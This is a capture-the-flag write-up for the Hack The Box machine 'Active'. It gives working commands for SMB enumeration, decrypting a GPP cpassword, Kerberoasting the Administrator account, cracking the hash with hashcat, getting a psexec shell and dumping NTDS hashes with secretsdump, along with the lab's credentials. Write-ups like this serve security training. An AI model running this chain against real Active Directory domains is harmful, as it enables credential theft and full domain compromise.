---
title: "[EASY] HTB-Active"
draft: false
tags:
  - htb
  - windows
  - active-directory
  - gpp
  - kerberoasting
  - psexec
---
## Information Gathering
### Rustscan
Based on the ports open, it is obvious this machine is Active Directory machine:

```bash
┌──(yoon㉿kali)-[~/Documents/htb/active]
└─$ sudo rustscan --addresses 10.10.10.100 --range 1-65535
.----. .-. .-. .----..---. .----. .---. .--. .-. .-.
| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \ | `| |
| .-. \| {_} |.-._} } | | .-._} }\ }/ /\ \| |\ |
`-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy :
: https://github.com/RustScan/RustScan :
--------------------------------------
😵 https://admin.tryhackme.com
[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
<snip>
Host is up, received echo-reply ttl 127 (0.35s latency).
Scanned at 2024-03-18 10:07:11 EDT for 6s

PORT STATE SERVICE REASON
88/tcp open kerberos-sec syn-ack ttl 127
135/tcp open msrpc syn-ack ttl 127
139/tcp filtered netbios-ssn no-response
389/tcp open ldap syn-ack ttl 127
593/tcp open http-rpc-epmap syn-ack ttl 127
636/tcp open ldapssl syn-ack ttl 127
9389/tcp open adws syn-ack ttl 127
47001/tcp open winrm syn-ack ttl 127
49152/tcp open unknown syn-ack ttl 127
49154/tcp open unknown syn-ack ttl 127
49155/tcp open unknown syn-ack ttl 127
49157/tcp open unknown syn-ack ttl 127
49158/tcp open unknown syn-ack ttl 127
49169/tcp open unknown syn-ack ttl 127
49182/tcp open unknown syn-ack ttl 127
  
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 5.87 seconds
Raw packets sent: 32 (1.384KB) | Rcvd: 16 (688B)
```
  

## Enumeration

### RPC - TCP 135
I was able to signin to RPC as null user but all the access was denied -> Dead End. 

`rpcclient -U "" -N 10.10.10.100`

![](https://i.imgur.com/0atiqxW.png)


### LDAP - TCP 389/3268
I first queried for base naming contexts: **DC=active,DC=htb**

`ldapsearch -H ldap://10.10.10.100 -x -s base namingcontexts`

![](https://i.imgur.com/XLFxpvF.png)

I tried on null sessions but it required authentication -> Dead End.

`ldapsearch -H ldap://10.10.10.100 -x -b "DC=active,DC=htb"`

![](https://i.imgur.com/tsXGXCt.png)


### SMB - TCP 445

Running crackmapexec with SMB, I can confirm the domain name: **active.htb**:


`crackmapexec smb 10.10.10.100`

![](https://i.imgur.com/GnnGjk9.png)


Using **smbclient**, I was able to list out shares without any creds.
  
Among all the shares, share **Replication** and **Users** seemed interesting to me:

`smbclient -N -L //10.10.10.100`

![](https://i.imgur.com/81iDAHc.png)


  
I tried accessing **Users** share, but access was denied: 

`smbclient -N //10.10.10.100/Users`

![](https://i.imgur.com/YXKc4Su.png)

## Replication Share - SMB
Luckily, **Replication** share was accessible: 

`smbclient -N //10.10.10.100/Replication`

![](https://i.imgur.com/ANbV2SB.png)


Recursively downloaded entire acitve.htb directory:

```bash
smb: \> mask ""
smb: \> lcd .
smb: \> prompt OFF
smb: \> recurse ON
smb: \> mget *
```

Now enumerating the share on my local kali machine, I discovered **Groups.xml** file which seemed to have exposed username and encrypted password for it:
  
**Username**: SVC_TGS
**cpassword**: edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ


`grep -ir 'password' active.htb`

![](https://i.imgur.com/qKfj3Cz.png)


## GPP Password Cracking

Googling a bit about what cpassword, I learned that it is usually used on Active Directory environment and it has weak encryption:

>A cpassword is used for setting passwords from the Group Policy Preferences. Cpasswords are encrypted using a weak encryption algorithm, which can be easily decrypted and used for lateral movement.

SImply running **gpp-decrypt** with the found cpassword, I was able to decrypt the hash:
  
**SVC_TGS**:**GPPstillStandingStrong2k18**

`gpp-decrypt hash`

![](https://i.imgur.com/vIROBEc.png)
### Checking Access

Checking what access this user got with crackmapexec, it seemed that I'd be able to access more shares with this user credentials:

`crackmapexec smb 10.10.10.100 -u SVC_TGS -p 'GPPstillStandingStrong2k18'`

![](https://i.imgur.com/KwavNlT.png)

Signing into **Users** share, I have access to user.txt

`smbclient //10.10.10.100/Users -U SVC_TGS%GPPstillStandingStrong2k18`

![](https://i.imgur.com/xH4JGZh.png)

I wanted better shell so I tried psexec but it wouldn't work in this case since SVC_TGS is not administrator user.
  
## Kerberoasting
Now with the credentials for user **SVC_TGS**, I tried kerberoasting, which gave me hash for user **Administrator**

`GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip dc.active.htb -request`

![](https://i.imgur.com/4waHocL.png)


### Hash cracking

I moved the found hash to **hashcat** and cracked it: **Ticketmaster1968**

`hashcat -m 13100 hash rockyou.txt`

![](https://i.imgur.com/czlVuiI.png)


### SMB as Administrator
  
Using the creds found above, I can now access Administrator directories through smb:

`smbclient //10.10.10.100/Users -U Administrator%Ticketmaster1968`

![](https://i.imgur.com/S7CHG7D.png)
 
  
## psexec shell as Administrator
Since I always pursue shell connection, I can **psexec** as Administrator as well:

`impacket-psexec active.htb/Administrator:'Ticketmaster1968'@10.10.10.100`

![](https://i.imgur.com/9Kw8Mwb.png)

## Beyond root
### Dumping NTDS.dit

I can also dump **NTDS.dit** using secretsdump.py:

`secretsdump.py active.htb/Administrator:'Ticketmaster1968'@10.10.10.100 -just-dc-ntlm`

![](https://i.imgur.com/GomR127.png)


  
  

